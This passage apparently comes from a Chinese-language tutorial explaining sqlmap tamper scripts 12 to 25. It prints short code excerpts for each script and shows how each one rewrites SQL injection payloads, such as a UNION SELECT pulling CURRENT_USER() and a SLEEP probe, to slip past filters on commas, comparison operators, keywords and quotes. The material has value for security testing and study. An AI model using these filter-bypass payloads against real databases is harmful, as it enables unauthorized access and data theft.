<h2 id="12-commalesslimit-py"><a href="#12-commalesslimit-py" class="headerlink" title="12.commalesslimit.py"></a>12.commalesslimit.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br>match = re.search(<span class="hljs-string">r&quot;(?i)LIMIT\s*(\d+),\s*(\d+)&quot;</span>, payload <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> match:<br>    retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;LIMIT %s OFFSET %s&quot;</span> % (match.group(<span class="hljs-number">2</span>), match.group(<span class="hljs-number">1</span>)))<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将-payload-中的逗号用-offset-代替，用于过滤了逗号并且是两个参数的情况。"><a href="#1-作用：将-payload-中的逗号用-offset-代替，用于过滤了逗号并且是两个参数的情况。" class="headerlink" title="1.作用：将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况。"></a>1.作用：将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况。</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LIMIT</span> <span class="hljs-number">2</span>, <span class="hljs-number">3</span> --&gt; LIMIT <span class="hljs-number">3</span> OFFSET <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-3"><a href="#2-要求：-3" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>


<h2 id="13-commalessmid-py"><a href="#13-commalessmid-py" class="headerlink" title="13.commalessmid.py"></a>13.commalessmid.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">match = re.search(<span class="hljs-string">r&quot;(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)&quot;</span>, payload <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> match:<br>    retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;MID(%s FROM %s FOR %s)&quot;</span> % (match.group(<span class="hljs-number">1</span>), match.group(<span class="hljs-number">2</span>), match.group(<span class="hljs-number">3</span>)))<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将-payload-中的逗号用-from-for-代替，用于过滤了逗号并且是三参数的情况"><a href="#1-作用：将-payload-中的逗号用-from-for-代替，用于过滤了逗号并且是三参数的情况" class="headerlink" title="1.作用：将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况"></a>1.作用：将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MID</span>(VERSION(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) -----&gt;MID(VERSION() FROM <span class="hljs-number">1</span> FOR <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-4"><a href="#2-要求：-4" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>


<h2 id="14-commentbeforeparentheses-py"><a href="#14-commentbeforeparentheses-py" class="headerlink" title="14.commentbeforeparentheses.py"></a>14.commentbeforeparentheses.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;\b(\w+)\(&quot;</span>, <span class="hljs-string">r&quot;\g&lt;1&gt;/**/(&quot;</span>, retVal)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在某个单词后的第一个括号前面加入-，用于过滤了函数的情况"><a href="#1-作用：在某个单词后的第一个括号前面加入-，用于过滤了函数的情况" class="headerlink" title="1.作用：在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况"></a>1.作用：在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">ABS</span>(<span class="hljs-number">1</span>)-----&gt;<span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">ABS</span><span class="hljs-comment">/**/</span>()<br></code></pre></td></tr></table></figure>


<h2 id="15-concat2concatws-py"><a href="#15-concat2concatws-py" class="headerlink" title="15.concat2concatws.py"></a>15.concat2concatws.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload:<br>    payload = payload.replace(<span class="hljs-string">&quot;CONCAT(&quot;</span>, <span class="hljs-string">&quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;</span>)<br><br><span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用于concat被过滤的情况，用concat-ws来解决"><a href="#1-作用：用于concat被过滤的情况，用concat-ws来解决" class="headerlink" title="1.作用：用于concat被过滤的情况，用concat_ws来解决"></a>1.作用：用于<code>concat</code>被过滤的情况，用concat_ws来解决</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CONCAT</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) ----&gt; CONCAT_WS(MID(CHAR(<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-5"><a href="#2-要求：-5" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>


<h2 id="16-equaltolike-py"><a href="#16-equaltolike-py" class="headerlink" title="16.equaltolike.py"></a>16.equaltolike.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;\s*=\s*&quot;</span>, <span class="hljs-string">&quot; LIKE &quot;</span>, retVal)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将-用like替换，用于-被过滤。"><a href="#1-作用：将-用like替换，用于-被过滤。" class="headerlink" title="1.作用：将=用like替换，用于=被过滤。"></a>1.作用：将<code>=</code>用<code>like</code>替换，用于<code>=</code>被过滤。</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=<span class="hljs-number">1</span> ------&gt; <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-built_in">LIKE</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>


<h2 id="17-escapequotes-py"><a href="#17-escapequotes-py" class="headerlink" title="17.escapequotes.py"></a>17.escapequotes.py</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">return</span> payload<span class="hljs-built_in">.replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>)<span class="hljs-built_in">.replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将单引号转换成-39-，双引号转换成-quot-，用于过滤了单引号或双引号的情况。"><a href="#1-作用：将单引号转换成-39-，双引号转换成-quot-，用于过滤了单引号或双引号的情况。" class="headerlink" title="1.作用：将单引号转换成 \\&#39; ，双引号转换成 \\&quot; ，用于过滤了单引号或双引号的情况。"></a>1.作用：将单引号转换成 <code>\\&#39;</code> ，双引号转换成 <code>\\&quot;</code> ，用于过滤了单引号或双引号的情况。</h3><h2 id="18-greatest-py"><a href="#18-greatest-py" class="headerlink" title="18.greatest.py"></a>18.greatest.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    match = re.search(<span class="hljs-string">r&quot;(?i)(\b(AND|OR)\b\s+)([^&gt;]+?)\s*&gt;\s*(\w+|&#x27;[^&#x27;]+&#x27;)&quot;</span>, payload)<br><br>    <span class="hljs-keyword">if</span> match:<br>        _ = <span class="hljs-string">&quot;%sGREATEST(%s,%s+1)=%s&quot;</span> % (match.group(<span class="hljs-number">1</span>), match.group(<span class="hljs-number">3</span>), match.group(<span class="hljs-number">4</span>), match.group(<span class="hljs-number">3</span>))<br>        retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), _)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用-greatest-代替大于符号，用于大于符号被过滤了的情况"><a href="#1-作用：用-greatest-代替大于符号，用于大于符号被过滤了的情况" class="headerlink" title="1.作用：用 greatest 代替大于符号，用于大于符号被过滤了的情况."></a>1.作用：用 greatest 代替大于符号，用于大于符号被过滤了的情况.</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">AND</span> A &gt; B -----&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> GREATEST(A,B+<span class="hljs-number">1</span>)=A<br></code></pre></td></tr></table></figure>


<h2 id="19-halfversionedmorekeywords-py"><a href="#19-halfversionedmorekeywords-py" class="headerlink" title="19.halfversionedmorekeywords.py"></a>19.halfversionedmorekeywords.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span>(<span class="hljs-params">match</span>):</span><br>    word = match.group(<span class="hljs-string">&#x27;word&#x27;</span>)<br>    <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords <span class="hljs-keyword">and</span> word.upper() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> IGNORE_SPACE_AFFECTED_KEYWORDS:<br>        <span class="hljs-keyword">return</span> match.group().replace(word, <span class="hljs-string">&quot;/*!0%s&quot;</span> % word)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> match.group()<br><br>retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span>, <span class="hljs-keyword">lambda</span> match: process(match), retVal)<br>    retVal = retVal.replace(<span class="hljs-string">&quot; /*!0&quot;</span>, <span class="hljs-string">&quot;/*!0&quot;</span>)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在关键字前添加注释，用于过滤了关键字的情况"><a href="#1-作用：在关键字前添加注释，用于过滤了关键字的情况" class="headerlink" title="1.作用：在关键字前添加注释，用于过滤了关键字的情况"></a>1.作用：在关键字前添加注释，用于过滤了关键字的情况</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-string">&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span><br><br>-----&gt;<br>value&#x27;/*!<span class="hljs-number">0</span>UNION/*!<span class="hljs-number">0</span>ALL/*!<span class="hljs-number">0</span>SELECT/*!<span class="hljs-number">0</span>CONCAT(/*!<span class="hljs-number">0</span>CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">107</span>,<span class="hljs-number">112</span>,<span class="hljs-number">113</span>,<span class="hljs-number">58</span>),/*!<span class="hljs-number">0</span>IFNULL(CAST(/*!<span class="hljs-number">0</span>CURRENT_USER()/*!<span class="hljs-number">0</span>AS/*!<span class="hljs-number">0</span>CHAR),/*!<span class="hljs-number">0</span>CHAR(<span class="hljs-number">32</span>)),/*!<span class="hljs-number">0</span>CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">97</span>,<span class="hljs-number">110</span>,<span class="hljs-number">121</span>,<span class="hljs-number">58</span>)),/*!<span class="hljs-number">0</span>NULL,/*!<span class="hljs-number">0</span>NULL#/*!<span class="hljs-number">0</span>AND <span class="hljs-string">&#x27;QDWa&#x27;</span>=<span class="hljs-string">&#x27;QDWa</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-6"><a href="#2-要求：-6" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL &lt; 5.1<br></code></pre></td></tr></table></figure>


<h2 id="20-htmlencode-py"><a href="#20-htmlencode-py" class="headerlink" title="20.htmlencode.py"></a>20.htmlencode.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> re.sub(<span class="hljs-string">r&quot;[^\w]&quot;</span>, <span class="hljs-keyword">lambda</span> match: <span class="hljs-string">&quot;&amp;#%d;&quot;</span> % <span class="hljs-built_in">ord</span>(match.group(<span class="hljs-number">0</span>)), payload) <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">else</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将payload进行html编码"><a href="#1-作用：将payload进行html编码" class="headerlink" title="1.作用：将payload进行html编码"></a>1.作用：将payload进行html编码</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; AND SLEEP(<span class="hljs-number">5</span>)# -----&gt;<span class="hljs-number">1</span>&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">32</span>;AND&amp;#<span class="hljs-number">32</span>;SLEEP&amp;#<span class="hljs-number">40</span>;<span class="hljs-number">5</span>&amp;#<span class="hljs-number">41</span>;&amp;#<span class="hljs-number">35</span>;<br></code></pre></td></tr></table></figure>


<h2 id="21-ifnull2ifisnull-py"><a href="#21-ifnull2ifisnull-py" class="headerlink" title="21.ifnull2ifisnull.py"></a>21.ifnull2ifisnull.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> payload.find(<span class="hljs-string">&quot;IFNULL&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">while</span> payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>        index = payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>)<br>        depth = <span class="hljs-number">1</span><br>        comma, end = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>), <span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>                comma = i<br><br>            <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                end = i<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;(&#x27;</span>:<br>                depth += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                depth -= <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> comma <span class="hljs-keyword">and</span> end:<br>            _ = payload[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>):comma]<br>            __ = payload[comma + <span class="hljs-number">1</span>:end].lstrip()<br>            newVal = <span class="hljs-string">&quot;IF(ISNULL(%s),%s,%s)&quot;</span> % (_, __, _)<br>            payload = payload[:index] + newVal + payload[end + <span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将-ifnull-函数转为-if-isnull-函数，用于过滤了-ifnull-函数的情况。"><a href="#1-作用：将-ifnull-函数转为-if-isnull-函数，用于过滤了-ifnull-函数的情况。" class="headerlink" title="1.作用：将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况。"></a>1.作用：将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况。</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ifnull</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) ------&gt; if(isnull(<span class="hljs-number">1</span>), <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-7"><a href="#2-要求：-7" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> MySQL<br><span class="hljs-bullet">    *</span> SQLite (possibly)<br><span class="hljs-bullet">    *</span> SAP MaxDB (possibly)<br></code></pre></td></tr></table></figure>


<h2 id="22-ifnull2casewhenisnull-py"><a href="#22-ifnull2casewhenisnull-py" class="headerlink" title="22.ifnull2casewhenisnull.py"></a>22.ifnull2casewhenisnull.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> payload.find(<span class="hljs-string">&quot;IFNULL&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">while</span> payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>        index = payload.find(<span class="hljs-string">&quot;IFNULL(&quot;</span>)<br>        depth = <span class="hljs-number">1</span><br>        comma, end = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>), <span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>                comma = i<br><br>            <span class="hljs-keyword">elif</span> depth == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                end = i<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;(&#x27;</span>:<br>                depth += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;)&#x27;</span>:<br>                depth -= <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> comma <span class="hljs-keyword">and</span> end:<br>            _ = payload[index + <span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;IFNULL(&quot;</span>):comma]<br>            __ = payload[comma + <span class="hljs-number">1</span>:end].lstrip()<br>            newVal = <span class="hljs-string">&quot;CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END&quot;</span> % (_, __, _)<br>            payload = payload[:index] + newVal + payload[end + <span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：改变ifnull-函数的表达形式，可用于逗号-被过滤的情况下又要使用ifnull-函数。"><a href="#1-作用：改变ifnull-函数的表达形式，可用于逗号-被过滤的情况下又要使用ifnull-函数。" class="headerlink" title="1.作用：改变ifnull()函数的表达形式，可用于逗号,被过滤的情况下又要使用ifnull()函数。"></a>1.作用：改变ifnull()函数的表达形式，可用于逗号<code>,</code>被过滤的情况下又要使用ifnull()函数。</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">IFNULL</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) ------&gt; CASE WHEN ISNULL(<span class="hljs-number">1</span>) THEN (<span class="hljs-number">2</span>) ELSE (<span class="hljs-number">1</span>) END<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-8"><a href="#2-要求：-8" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Requirement:<br><span class="hljs-bullet">    *</span> MySQL<br><span class="hljs-bullet">    *</span> SQLite (possibly)<br><span class="hljs-bullet">    *</span> SAP MaxDB (possibly)<br></code></pre></td></tr></table></figure>




<h2 id="23-informationschemacomment-py"><a href="#23-informationschemacomment-py" class="headerlink" title="23.informationschemacomment.py"></a>23.informationschemacomment.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = re.sub(<span class="hljs-string">r&quot;(?i)(information_schema)\.&quot;</span>, <span class="hljs-string">r&quot;\g&lt;1&gt;/**/.&quot;</span>, payload)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在-information-schema-后面加上-，用于绕过对-information-schema-的情况。"><a href="#1-作用：在-information-schema-后面加上-，用于绕过对-information-schema-的情况。" class="headerlink" title="1.作用：在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况。"></a>1.作用：在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况。</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">SELECT</span> table_name <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.TABLES<br>---&gt;<span class="hljs-built_in">SELECT</span> table_name <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA<span class="hljs-comment">/**/</span>.TABLES<br></code></pre></td></tr></table></figure>


<h2 id="24-least-py"><a href="#24-least-py" class="headerlink" title="24.least.py"></a>24.least.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    match = re.search(<span class="hljs-string">r&quot;(?i)(\b(AND|OR)\b\s+)([^&gt;]+?)\s*&gt;\s*(\w+|&#x27;[^&#x27;]+&#x27;)&quot;</span>, payload)<br><br>    <span class="hljs-keyword">if</span> match:<br>        _ = <span class="hljs-string">&quot;%sLEAST(%s,%s+1)=%s+1&quot;</span> % (match.group(<span class="hljs-number">1</span>), match.group(<span class="hljs-number">3</span>), match.group(<span class="hljs-number">4</span>), match.group(<span class="hljs-number">4</span>))<br>        retVal = retVal.replace(match.group(<span class="hljs-number">0</span>), _)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：替换大于号为least，用于大于号-gt-被过滤的情况。"><a href="#1-作用：替换大于号为least，用于大于号-gt-被过滤的情况。" class="headerlink" title="1.作用：替换大于号为least，用于大于号(&gt;)被过滤的情况。"></a>1.作用：替换大于号为least，用于大于号(&gt;)被过滤的情况。</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">AND</span> A &gt; B -----&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> LEAST(A,B+<span class="hljs-number">1</span>)=B+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>


<h2 id="25-lowercase-py"><a href="#25-lowercase-py" class="headerlink" title="25.lowercase.py"></a>25.lowercase.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b[A-Za-z_]+\b&quot;</span>, retVal):<br>        word = match.group()<br><br>        <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>            retVal = retVal.replace(word, word.lower())<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
